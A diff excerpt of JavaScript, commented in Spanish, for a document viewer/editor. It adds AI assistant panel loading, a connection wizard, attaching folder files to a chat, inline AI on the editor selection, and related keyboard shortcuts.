+        if (tocSidebar.getBoundingClientRect().width < AI_PANEL_MIN_WIDTH) applyTocWidth(AI_PANEL_MIN_WIDTH);
+        if (window.DBVFileTree) window.DBVFileTree.setActiveTab('ai');
+      } else if (window.DBVFileTree) window.DBVFileTree.setActiveTab('index');
+    },
+    openConnect: function () { aiConnectModalCtl().open(); },
+    closeConnect: function () { aiConnectModalCtl().close(); },
+    onVisibilityChanged: function (info) {
+      aiState.showAi = info.visible;
+      aiState.connected = info.connected;
+      refreshAiVisibility();
+    }
+  };
+
+  function loadAi() {
+    if (!aiLoading) {
+      aiLoading = import('./ai/entry.js')
+        .then(function (entry) { return entry.createAi(aiHost); })
+        .then(function (app) { aiApp = app; app.onRootChanged(aiRoot()); return app; })
+        .catch(function (err) {
+          aiLoading = null;
+          console.error('[ai]', err);
+          showToast(t('ai.loadFailed'), 'error');
+          throw err;
+        });
+    }
+    return aiLoading;
+  }
+
+  /** Abre el Asistente; sin ninguna IA conectada, abre antes el asistente de conexión (RF-31.1). */
+  function openAssistant() {
+    if (isAndroid || !aiState.showAi) return;
+    loadAi().then(function (app) {
+      if (!app.isReady()) { app.openConnect(); return; }
+      aiHost.showPanel(true);
+      app.focusInput();
+    }).catch(function () {});
+  }
+
+  function toggleAssistant() {
+    var showing = !tocSidebar.classList.contains('hidden') && tabAi.classList.contains('active');
+    if (showing) aiHost.showPanel(false); else openAssistant();
+  }
+
+  /** Adjunta un documento de la carpeta a la conversación (menú contextual del árbol, RF-33.2). */
+  function attachToAi(path) {
+    var root = aiRoot();
+    if (!root) return;
+    var normBase = root.replace(/\\/g, '/').replace(/\/+$/, '');
+    var norm = String(path).replace(/\\/g, '/');
+    if (norm.indexOf(normBase + '/') !== 0) { showToast(t('ai.outsideFolder'), 'error'); return; }
+    var relative = norm.slice(normBase.length + 1);
+    loadAi().then(function (app) {
+      if (!app.isReady()) { app.openConnect(); return; }
+      app.attachFile(relative);
+    }).catch(function () {});
+  }
+
+  /** IA en línea sobre la selección del editor (RF-36); necesita el Modo Edición. */
+  function openInlineAi() {
+    if (isAndroid || !aiState.showAi) return;
+    if (!editMode) { showToast(t('ai.inline.needEdit'), 'error'); return; }
+    loadAi().then(function (app) {
+      if (!app.isReady()) app.openConnect(); else app.inline.open();
+    }).catch(function () {});
+  }
+
+  btnAi.addEventListener('click', toggleAssistant);
+
+  // El menú contextual del editor ofrece la IA en línea solo si ya hay una IA conectada: sin ella no hace falta cargar nada.
+  editorMenuProviders.push(function () {
+    if (isAndroid || !aiState.showAi || !aiState.connected) return [];
+    return [{ id: 'aiInline', label: t('ai.menu.inline'), hint: 'Ctrl+Alt+I', run: openInlineAi }];
+  });
+
+  // Estado inicial: una lectura del fichero de conexiones, sin cargar la IA.
+  if (!isAndroid) {
+    invoke('ai_connections').then(function (file) {
+      aiState.showAi = file.showAi !== false;
+      aiState.connected = file.connections.length > 0;
+      refreshAiVisibility();
+    }).catch(function (err) { console.warn('[ai_connections]', err); });
+  }
+
+  // La carpeta de la IA sigue al documento activo (la misma regla que el árbol de RF-25).
+  function aiNotifyDocument() { if (aiApp) aiApp.onRootChanged(aiRoot()); }
+
+  // =========================================================================
   // Atajos de teclado
   // =========================================================================
 
   window.addEventListener('keydown', function (e) {
     // Ctrl en Windows/Linux, Cmd en macOS: mismos atajos en las tres plataformas.
     var mod = e.ctrlKey || e.metaKey;
-    if      (mod && e.key === 'f') { e.preventDefault(); searchPanel.open(); }
+    // Ctrl/Cmd+Alt+P: del editor a la preview (RF-30.3). Va primero y por `code`:
+    // con Alt, `e.key` cambia según la distribución del teclado, y no debe
+    // llegar a la regla de imprimir de más abajo.
+    if (mod && e.altKey && !e.shiftKey && e.code === 'KeyP') { e.preventDefault(); goToPreviewFromEditor(); }
+    else if (mod && e.shiftKey && !e.altKey && e.code === 'KeyI') { e.preventDefault(); toggleAssistant(); }
+    else if (mod && e.altKey && !e.shiftKey && e.code === 'KeyI') { e.preventDefault(); openInlineAi(); }
+    else if (mod && e.key === 'f') { e.preventDefault(); searchPanel.open(); }
     else if (mod && e.key === 'n') { e.preventDefault(); createNewFile(); }
     else if (mod && e.key === 'o') { e.preventDefault(); openFileDialog(); }
-    else if (mod && e.key === 'p') { e.preventDefault(); window.print(); }
+    else if (mod && !e.altKey && e.key === 'p') { e.preventDefault(); window.print(); }
     else if (mod && e.key === 'e') { e.preventDefault(); toggleEditMode(); }
     else if (mod && e.key === 's') { e.preventDefault(); saveCurrentDocument(); }
     else if (mod && e.key === 'k') { e.preventDefault(); if (window.DBVFileTree) window.DBVFileTree.toggleQuickOpen(); }
